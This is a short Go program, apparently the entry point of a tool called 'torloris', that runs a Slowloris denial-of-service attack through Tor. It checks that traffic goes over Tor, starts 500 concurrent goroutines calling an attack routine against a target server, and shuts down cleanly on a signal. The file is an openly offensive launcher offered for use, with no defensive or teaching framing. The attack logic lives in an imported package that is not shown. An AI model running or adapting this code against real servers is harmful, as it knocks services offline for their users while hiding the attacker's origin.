package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/tacusci/logging"
	"github.com/tauraamui/torloris/slowloris"
)

func main() {
	client, err := slowloris.NewClient()

	if err != nil {
		logging.ErrorAndExit(err.Error())
	}

	go listenForStopSig(client)

	logging.InfoNnlNoColor("Checking connected via Tor service... ")
	if client.CheckTorConnection() {
		logging.GreenOutput("Connected!\n")
	} else {
		logging.RedOutput("Not connected!\n")
	}

	client.Running = true

	for i := 0; i < 500; i++ {
		go client.Attack("")
	}

	for client.Running {}
}

func listenForStopSig(client *slowloris.Client) {
	var gracefulStop = make(chan os.Signal)
	signal.Notify(gracefulStop, syscall.SIGTERM)
	signal.Notify(gracefulStop, syscall.SIGINT)
	sig := <-gracefulStop
	client.Close()
	logging.Error(fmt.Sprintf("☠️  Caught sig: %+v (Shutting down and cleaning up...) ☠️", sig))
	os.Exit(0)
}
